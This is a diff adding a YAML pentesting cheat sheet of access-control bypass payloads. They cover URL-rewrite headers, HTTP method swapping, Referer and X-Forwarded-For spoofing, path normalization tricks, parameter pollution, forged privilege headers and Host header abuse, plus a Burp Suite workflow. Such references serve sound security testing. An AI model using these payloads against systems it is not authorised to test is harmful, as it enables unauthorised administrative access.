@@ -1,0 +1,334 @@
+name: Access Control Bypass Techniques
+
+steps:
+  - title: URL Rewrite Header Bypass
+    mode: chain
+    info: |
+      Test whether front-end routing differs from backend authorization.
+
+    entries:
+      - cmd: "X-Original-URL: /admin"
+        info: backend route override
+
+      - cmd: "X-Rewrite-URL: /admin"
+        info: rewrite header bypass
+
+      - cmd: "X-Original-URL: /admin/delete"
+        info: privileged action access
+
+      - cmd: "GET / HTTP/1.1"
+        info: valid frontend path
+
+    look_for:
+      - admin panel access
+      - backend-only responses
+      - routing inconsistencies
+      - bypassed frontend restrictions
+
+    notes:
+      - common in reverse proxy setups
+      - frontend may validate different path than backend
+
+  - title: HTTP Method Bypass
+    mode: chain
+    info: |
+      Test alternative HTTP methods against protected endpoints.
+
+    entries:
+      - cmd: "POST → GET"
+        info: convert privileged action
+
+      - cmd: "POST → POSTX"
+        info: framework parsing quirks
+
+      - cmd: "POST → PUT"
+        info: alternate update method
+
+      - cmd: "POST → PATCH"
+        info: partial update bypass
+
+      - cmd: "POST → DELETE"
+        info: delete method abuse
+
+      - cmd: "OPTIONS"
+        info: enumerate allowed methods
+
+    look_for:
+      - authorization bypass
+      - inconsistent validation
+      - different responses
+      - accepted alternate methods
+
+    notes:
+      - some frameworks validate only specific methods
+      - test all supported verbs
+
+  - title: Referer-Based Bypass
+    mode: chain
+    info: |
+      Test whether authorization depends on the Referer header.
+
+    entries:
+      - cmd: "Referer: /admin"
+        info: trusted admin referer
+
+      - cmd: "Referer: https://target/admin"
+        info: full URL referer
+
+      - cmd: "Remove Referer"
+        info: missing header behavior
+
+      - cmd: "Forge trusted Referer"
+        info: referer spoofing
+
+    look_for:
+      - accepted forged requests
+      - inconsistent validation
+      - privileged functionality
+      - missing server-side checks
+
+  - title: IP-Based Access Control Bypass
+    mode: enum
+    info: |
+      Test headers commonly trusted by proxies and load balancers.
+
+    entries:
+      - cmd: "X-Forwarded-For: 127.0.0.1"
+        info: localhost spoofing
+
+      - cmd: "X-Forwarded-Host: localhost"
+        info: trusted host spoofing
+
+      - cmd: "X-Real-IP: 127.0.0.1"
+        info: alternate IP header
+
+      - cmd: "Client-IP: 127.0.0.1"
+        info: legacy IP header
+
+      - cmd: "Forwarded: for=127.0.0.1"
+        info: RFC forwarding header
+
+    look_for:
+      - localhost trust
+      - admin access
+      - debug functionality
+      - bypassed restrictions
+
+  - title: Path Normalization Bypass
+    mode: enum
+    info: |
+      Test alternative path representations.
+
+    entries:
+      - cmd: "/admin/"
+        info: trailing slash
+
+      - cmd: "/ADMIN"
+        info: case variation
+
+      - cmd: "/admin/..;/"
+        info: path confusion
+
+      - cmd: "/%61dmin"
+        info: URL encoding
+
+      - cmd: "/admin%20"
+        info: whitespace suffix
+
+      - cmd: "/./admin"
+        info: relative path
+
+      - cmd: "//admin//"
+        info: duplicate separators
+
+      - cmd: "/admin..;/"
+        info: parser inconsistency
+
+    look_for:
+      - different routing behavior
+      - bypassed filters
+      - inconsistent normalization
+      - backend/frontend mismatch
+
+  - title: Extension and Suffix Bypass
+    mode: enum
+    info: |
+      Test alternate extensions and suffixes.
+
+    entries:
+      - cmd: "/admin.json"
+        info: alternate route
+
+      - cmd: "/admin.xml"
+        info: XML endpoint
+
+      - cmd: "/admin.php"
+        info: explicit extension
+
+      - cmd: "/admin;"
+        info: parser bypass
+
+      - cmd: "/admin."
+        info: suffix variation
+
+      - cmd: "/admin%00"
+        info: null byte attempt
+
+    look_for:
+      - alternate content handling
+      - backend route exposure
+      - inconsistent filtering
+
+  - title: Parameter Pollution
+    mode: enum
+    info: |
+      Test duplicate and conflicting parameters.
+
+    entries:
+      - cmd: "role=user&role=admin"
+        info: duplicate role parameter
+
+      - cmd: "id=1&id=2"
+        info: conflicting object reference
+
+      - cmd: "admin=false&admin=true"
+        info: boolean override
+
+      - cmd: "access=user&access=admin"
+        info: privilege override
+
+    look_for:
+      - parameter precedence
+      - backend parsing quirks
+      - accepted privilege values
+      - inconsistent behavior
+
+  - title: Header-Based Privilege Abuse
+    mode: enum
+    info: |
+      Test custom headers affecting authorization.
+
+    entries:
+      - cmd: "X-Admin: true"
+        info: admin header
+
+      - cmd: "X-Role: admin"
+        info: role assignment
+
+      - cmd: "X-User: administrator"
+        info: user spoofing
+
+      - cmd: "X-Authenticated-User: admin"
+        info: authentication trust
+
+      - cmd: "X-Forwarded-User: admin"
+        info: proxy-auth trust
+
+    look_for:
+      - trusted upstream headers
+      - backend assumptions
+      - bypassed authentication
+      - elevated access
+
+  - title: Content-Type Bypass
+    mode: enum
+    info: |
+      Test whether authorization differs by content type.
+
+    entries:
+      - cmd: "Content-Type: application/json"
+        info: JSON handling
+
+      - cmd: "Content-Type: multipart/form-data"
+        info: multipart parsing
+
+      - cmd: "Content-Type: text/plain"
+        info: plain text parsing
+
+      - cmd: "Content-Type: application/xml"
+        info: XML parser behavior
+
+    look_for:
+      - alternate request handling
+      - skipped validation
+      - inconsistent parsing
+      - bypassed filters
+
+  - title: Host Header Abuse
+    mode: enum
+    info: |
+      Test host-based trust assumptions.
+
+    entries:
+      - cmd: "Host: localhost"
+        info: localhost trust
+
+      - cmd: "Host: admin.target.com"
+        info: virtual host routing
+
+      - cmd: "X-Forwarded-Host: admin.target.com"
+        info: proxy routing
+
+      - cmd: "X-Host: localhost"
+        info: alternate host header
+
+    look_for:
+      - internal routing
+      - trusted host behavior
+      - admin functionality
+      - virtual host exposure
+
+  - title: Authorization Response Analysis
+    mode: chain
+    info: |
+      Compare blocked and bypassed responses carefully.
+
+    entries:
+      - cmd: "Compare status codes"
+        info: authorization differences
+
+      - cmd: "Compare response lengths"
+        info: hidden content
+
+      - cmd: "Inspect redirect bodies"
+        info: leaked data
+
+      - cmd: "Review hidden JSON fields"
+        info: partial authorization
+
+    look_for:
+      - leaked admin data
+      - inconsistent responses
+      - hidden functionality
+      - verbose backend errors
+
+    notes:
+      - Burp Comparer
+      - disable automatic redirects
+      - compare authorized vs bypassed responses
+
+  - title: Useful Burp Workflow
+    mode: enum
+    info: |
+      Common workflow for access control bypass testing.
+
+    entries:
+      - cmd: "Proxy"
+        info: capture baseline requests
+
+      - cmd: "Repeater"
+        info: replay modified requests
+
+      - cmd: "Comparer"
+        info: diff responses
+
+      - cmd: "Intruder"
+        info: fuzz paths and headers
+
+      - cmd: "Logger"
+        info: track bypass attempts
+
+    notes:
+      - test one mutation at a time
+      - compare every response carefully
+      - backend behavior often leaks through subtle differences
